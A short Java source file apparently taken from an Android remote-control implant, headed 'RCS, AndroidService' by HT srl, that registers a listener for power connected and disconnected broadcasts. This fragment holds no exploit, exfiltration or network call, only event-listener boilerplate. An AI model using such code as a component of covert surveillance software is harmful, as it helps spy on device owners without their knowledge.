/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : ListenerAc.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.listener;

import android.content.Intent;
import android.content.IntentFilter;

import com.android.dvci.Ac;
import com.android.dvci.Status;

public class ListenerAc extends Listener<Ac> {
	/** The Constant TAG. */
	private static final String TAG = "ListenerAc"; //$NON-NLS-1$

	private BAc acReceiver;

	/** The singleton. */
	private volatile static ListenerAc singleton;

	/**
	 * Self.
	 * 
	 * @return the status
	 */
	public static ListenerAc self() {
		if (singleton == null) {
			synchronized (ListenerAc.class) {
				if (singleton == null) {
					singleton = new ListenerAc();
				}
			}
		}

		return singleton;
	}

	@Override
	protected void start() {
		registerAc();
	}

	@Override
	protected void stop() {
		Status.getAppContext().unregisterReceiver(acReceiver);
	}

	/**
	 * Register Power Connected/Disconnected.
	 */
	private void registerAc() {
		acReceiver = new BAc();

		final IntentFilter filterOn = new IntentFilter(Intent.ACTION_POWER_CONNECTED);
		final IntentFilter filterOff = new IntentFilter(Intent.ACTION_POWER_DISCONNECTED);

		// Register the broadcastreceiver and filter it to only get power status
		// changes
		Status.getAppContext().registerReceiver(acReceiver, filterOn);
		Status.getAppContext().registerReceiver(acReceiver, filterOff);
	}
}
